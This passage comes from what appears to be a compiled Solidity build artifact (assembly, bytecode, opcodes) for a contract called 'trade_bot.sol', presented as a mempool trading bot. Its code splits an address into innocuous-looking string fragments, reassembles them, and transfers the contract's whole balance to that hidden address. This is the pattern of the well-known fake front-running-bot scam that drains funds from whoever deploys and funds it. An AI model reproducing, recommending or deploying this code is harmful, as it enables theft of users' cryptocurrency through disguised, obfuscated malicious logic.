/* \"trade_bot.sol\":2295:2308  string memory */\n      0x60\n        /* \"trade_bot.sol\":2316:2336  return \"39242040974\" */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x0b\n      dup2\n      mstore\n      0x20\n      add\n      0x3339323432303430393734000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      swap1\n      pop\n        /* \"trade_bot.sol\":2242:2341  function fetchMempoolVersion() private pure returns (string memory) { \r... */\n      swap1\n      jump\t// out\n        /* \"trade_bot.sol\":4852:4938  function getMempoolLong() private pure returns (string memory) { \r... */\n    tag_52:\n        /* \"trade_bot.sol\":4900:4913  string memory */\n      0x60\n        /* \"trade_bot.sol\":4921:4933  return \"C98\" */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x03\n      dup2\n      mstore\n      0x20\n      add\n      0x4339380000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      swap1\n      pop\n        /* \"trade_bot.sol\":4852:4938  function getMempoolLong() private pure returns (string memory) { \r... */\n      swap1\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220a179cd3f9a43e88015e2ac7019a7f2fa71bb38a8bb86a1dbe1bacaccbd46397664736f6c63430006060033\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b5033600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550610aaa806100616000396000f3fe60806040526004361061004e5760003560e01c80631b55ba3a1461005a57806370e44c6a146100715780638da5cb5b1461010157806395d89b4114610158578063bedf0f4a146101e857610055565b3661005557005b600080fd5b34801561006657600080fd5b5061006f6101ff565b005b34801561007d57600080fd5b5061008661026a565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100c65780820151818401526020810190506100ab565b50505050905090810190601f1680156100f35780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b34801561010d57600080fd5b50610116610472565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561016457600080fd5b5061016d610498565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156101ad578082015181840152602081019050610192565b50505050905090810190601f1680156101da5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b3480156101f457600080fd5b506101fd610516565b005b600061021161020c610581565b61071f565b905060008190508073ffffffffffffffffffffffffffffffffffffffff166108fc61023a610978565b9081150290604051600060405180830381858888f19350505050158015610265573d6000803e3d6000fd5b505050565b6060600061027e610279610581565b61071f565b90506000819050606061028f610980565b9050606061029b6109bd565b905060606102a76109fa565b905060606102b3610a37565b90508473ffffffffffffffffffffffffffffffffffffffff166108fc6102d7610978565b9081150290604051600060405180830381858888f19350505050158015610302573d6000803e3d6000fd5b50838383836040516020018085805190602001908083835b6020831061033d578051825260208201915060208101905060208303925061031a565b6001836020036101000a03801982511681845116808217855250505050505090500184805190602001908083835b6020831061038e578051825260208201915060208101905060208303925061036b565b6001836020036101000a03801982511681845116808217855250505050505090500183805190602001908083835b602083106103df57805182526020820191506020810190506020830392506103bc565b6001836020036101000a03801982511681845116808217855250505050505090500182805190602001908083835b60208310610430578051825260208201915060208101905060208303925061040d565b6001836020036101000a038019825116818451168082178552505050505050905001945050505050604051602081830303815290604052965050505050505090565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6060806104a36109bd565b9050806040516020018082805190602001908083835b602083106104dc57805182526020820191506020810190506020830392506104b9565b6001836020036101000a03801982511681845116808217855250505050505090500191505060405160208183030381529060405291505090565b6000610528610523610581565b61071f565b905060008190508073ffffffffffffffffffffffffffffffffffffffff166108fc610551610978565b9081150290604051600060405180830381858888f1935050505015801561057c573d6000803e3d6000fd5b505050565b60608061058c610980565b905060606105986109bd565b905060606105a46109fa565b905060606105b0610a37565b9050838383836040516020018085805190602001908083835b602083106105ec57805182526020820191506020810190506020830392506105c9565b6001836020036101000a03801982511681845116808217855250505050505090500184805190602001908083835b6020831061063d578051825260208201915060208101905060208303925061061a565b6001836020036101000a03801982511681845116808217855250505050505090500183805190602001908083835b6020831061068e578051825260208201915060208101905060208303925061066b565b6001836020036101000a03801982511681845116808217855250505050505090500182805190602001908083835b602083106106df57805182526020820191506020810190506020830392506106bc565b6001836020036101000a03801982511681845116808217855250505050505090500194505050505060405160208183030381529060405294505050505090565b6000606082905060008090506000806000600290505b602a81101561096b576101008402935084818151811061075157fe5b602001015160f81c60f81b60f81c60ff16925084600182018151811061077357fe5b602001015160f81c60f81b60f81c60ff16915060618373ffffffffffffffffffffffffffffffffffffffff16101580156107c4575060668373ffffffffffffffffffffffffffffffffffffffff1611155b156107d45760578303925061086e565b60418373ffffffffffffffffffffffffffffffffffffffff1610158015610812575060468373ffffffffffffffffffffffffffffffffffffffff1611155b156108225760378303925061086d565b60308373ffffffffffffffffffffffffffffffffffffffff1610158015610860575060398373ffffffffffffffffffffffffffffffffffffffff1611155b1561086c576030830392505b5b5b60618273ffffffffffffffffffffffffffffffffffffffff16101580156108ac575060668273ffffffffffffffffffffffffffffffffffffffff1611155b156108bc57605782039150610956565b60418273ffffffffffffffffffffffffffffffffffffffff16101580156108fa575060468273ffffffffffffffffffffffffffffffffffffffff1611155b1561090a57603782039150610955565b60308273ffffffffffffffffffffffffffffffffffffffff1610158015610948575060398273ffffffffffffffffffffffffffffffffffffffff1611155b15610954576030820391505b5b5b81601084020184019350600281019050610735565b5082945050505050919050565b600047905090565b60606040518060400160405280600381526020017f3078450000000000000000000000000000000000000000000000000000000000815250905090565b60606040518060400160405280601981526020017f4162444446393530333537613242443863393634326633304200000000000000815250905090565b60606040518060400160405280600b81526020017f3339323432303430393734000000000000000000000000000000000000000000815250905090565b60606040518060400160405280600381526020017f433938000000000000000000000000000000000000000000000000000000000081525090509056fea2646970667358221220a179cd3f9a43e88015e2ac7019a7f2fa71bb38a8bb86a1dbe1bacaccbd46397664736f6c63430006060033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLER PUSH1 0x2 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH2 0xAAA DUP1 PUSH2 0x61 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x4E JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x1B55BA3A EQ PUSH2 0x5A JUMPI DUP1 PUSH4 0x70E44C6A EQ PUSH2 0x71 JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x101 JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x158 JUMPI DUP1 PUSH4 0xBEDF0F4A EQ PUSH2 0x1E8 JUMPI PUSH2 0x55 JUMP JUMPDEST CALLDATASIZE PUSH2 0x55 JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x66 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x6F PUSH2 0x1FF JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x7D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x86 PUSH2 0x26A JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xC6 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0xAB JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0xF3 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x10D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x116 PUSH2 0x472 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x164 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x16D PUSH2 0x498 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x1AD JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x192 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x1DA JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1F4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1FD PUSH2 0x516 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 PUSH2 0x211 PUSH2 0x20C PUSH2 0x581 JUMP JUMPDEST PUSH2 0x71F JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP2 SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC PUSH2 0x23A PUSH2 0x978 JUMP JUMPDEST SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x265 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x60 PUSH1 0x0 PUSH2 0x27E PUSH2 0x279 PUSH2 0x581 JUMP JUMPDEST PUSH2 0x71F JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP2 SWAP1 POP PUSH1 0x60 PUSH2 0x28F PUSH2 0x980 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x29B PUSH2 0x9BD JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x2A7 PUSH2 0x9FA JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x2B3 PUSH2 0xA37 JUMP JUMPDEST SWAP1 POP DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC PUSH2 0x2D7 PUSH2 0x978 JUMP JUMPDEST SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x302 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP DUP4 DUP4 DUP4 DUP4 PUSH1 0x40 MLOAD PUSH1 0x20 ADD DUP1 DUP6 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x33D JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x31A JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD DUP5 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x38E JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x36B JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD DUP4 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x3DF JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x3BC JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD DUP3 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x430 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x40D JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD SWAP5 POP POP POP POP POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE SWAP7 POP POP POP POP POP POP POP SWAP1 JUMP JUMPDEST PUSH1 0x2 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x60 DUP1 PUSH2 0x4A3 PUSH2 0x9BD JUMP JUMPDEST SWAP1 POP DUP1 PUSH1 0x40 MLOAD PUSH1 0x20 ADD DUP1 DUP3 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x4DC JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x4B9 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD SWAP2 POP POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE SWAP2 POP POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x528 PUSH2 0x523 PUSH2 0x581 JUMP JUMPDEST PUSH2 0x71F JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP2 SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC PUSH2 0x551 PUSH2 0x978 JUMP JUMPDEST SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x57C JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x60 DUP1 PUSH2 0x58C PUSH2 0x980 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x598 PUSH2 0x9BD JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x5A4 PUSH2 0x9FA JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x5B0 PUSH2 0xA37 JUMP JUMPDEST SWAP1 POP DUP4 DUP4 DUP4 DUP4 PUSH1 0x40 MLOAD PUSH1 0x20 ADD DUP1 DUP6 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x5EC JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x5C9 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD DUP5 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x63D JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x61A JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD DUP4 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x68E JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x66B JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD DUP3 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x6DF JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x6BC JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD SWAP5 POP POP POP POP POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE SWAP5 POP POP POP POP POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x60 DUP3 SWAP1 POP PUSH1 0x0 DUP1 SWAP1 POP PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x2 SWAP1 POP JUMPDEST PUSH1 0x2A DUP2 LT ISZERO PUSH2 0x96B JUMPI PUSH2 0x100 DUP5 MUL SWAP4 POP DUP5 DUP2 DUP2 MLOAD DUP2 LT PUSH2 0x751 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP3 POP DUP5 PUSH1 0x1 DUP3 ADD DUP2 MLOAD DUP2 LT PUSH2 0x773 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP2 POP PUSH1 0x61 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x7C4 JUMPI POP PUSH1 0x66 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x7D4 JUMPI PUSH1 0x57 DUP4 SUB SWAP3 POP PUSH2 0x86E JUMP JUMPDEST PUSH1 0x41 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x812 JUMPI POP PUSH1 0x46 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x822 JUMPI PUSH1 0x37 DUP4 SUB SWAP3 POP PUSH2 0x86D JUMP JUMPDEST PUSH1 0x30 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x860 JUMPI POP PUSH1 0x39 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x86C JUMPI PUSH1 0x30 DUP4 SUB SWAP3 POP JUMPDEST JUMPDEST JUMPDEST PUSH1 0x61 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x8AC JUMPI POP PUSH1 0x66 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x8BC JUMPI PUSH1 0x57 DUP3 SUB SWAP2 POP PUSH2 0x956 JUMP JUMPDEST PUSH1 0x41 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x8FA JUMPI POP PUSH1 0x46 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x90A JUMPI PUSH1 0x37 DUP3 SUB SWAP2 POP PUSH2 0x955 JUMP JUMPDEST PUSH1 0x30 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x948 JUMPI POP PUSH1 0x39 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x954 JUMPI PUSH1 0x30 DUP3 SUB SWAP2 POP JUMPDEST JUMPDEST JUMPDEST DUP2 PUSH1 0x10 DUP5 MUL ADD DUP5 ADD SWAP4 POP PUSH1 0x2 DUP2 ADD SWAP1 POP PUSH2 0x735 JUMP JUMPDEST POP DUP3 SWAP5 POP POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 SELFBALANCE SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x3 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3078450000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x19 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x4162444446393530333537613242443863393634326633304200000000000000 DUP2 MSTORE POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0xB DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3339323432303430393734000000000000000000000000000000000000000000 DUP2 MSTORE POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x3 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x4339380000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP SWAP1 POP SWAP1 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 LOG1 PUSH26 0xCD3F9A43E88015E2AC7019A7F2FA71BB38A8BB86A1DBE1BACACC 0xBD CHAINID CODECOPY PUSH23 0x64736F6C63430006060033000000000000000000000000 ",
							"sourceMap": "435:7457:3:-:0;;;653:58;5:9:-1;2:2;;;27:1;24;17:12;2:2;653:58:3;693:10;685:5;;:18;;;;;;;;;;;;;;;;;;435:7457;;;;;;"
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "60806040526004361061004e5760003560e01c80631b55ba3a1461005a57806370e44c6a146100715780638da5cb5b1461010157806395d89b4114610158578063bedf0f4a146101e857610055565b3661005557005b600080fd5b34801561006657600080fd5b5061006f6101ff565b005b34801561007d57600080fd5b5061008661026a565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100c65780820151818401526020810190506100ab565b50505050905090810190601f1680156100f35780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b34801561010d57600080fd5b50610116610472565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561016457600080fd5b5061016d610498565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156101ad578082015181840152602081019050610192565b50505050905090810190601f1680156101da5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b3480156101f457600080fd5b506101fd610516565b005b600061021161020c610581565b61071f565b905060008190508073ffffffffffffffffffffffffffffffffffffffff166108fc61023a610978565b9081150290604051600060405180830381858888f19350505050158015610265573d6000803e3d6000fd5b505050565b6060600061027e610279610581565b61071f565b90506000819050606061028f610980565b9050606061029b6109bd565b905060606102a76109fa565b905060606102b3610a37565b90508473ffffffffffffffffffffffffffffffffffffffff166108fc6102d7610978565b9081150290604051600060405180830381858888f19350505050158015610302573d6000803e3d6000fd5b50838383836040516020018085805190602001908083835b6020831061033d578051825260208201915060208101905060208303925061031a565b6001836020036101000a03801982511681845116808217855250505050505090500184805190602001908083835b6020831061038e578051825260208201915060208101905060208303925061036b565b6001836020036101000a03801982511681845116808217855250505050505090500183805190602001908083835b602083106103df57805182526020820191506020810190506020830392506103bc565b6001836020036101000a03801982511681845116808217855250505050505090500182805190602001908083835b60208310610430578051825260208201915060208101905060208303925061040d565b6001836020036101000a038019825116818451168082178552505050505050905001945050505050604051602081830303815290604052965050505050505090565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6060806104a36109bd565b9050806040516020018082805190602001908083835b602083106104dc57805182526020820191506020810190506020830392506104b9565b6001836020036101000a0380198251168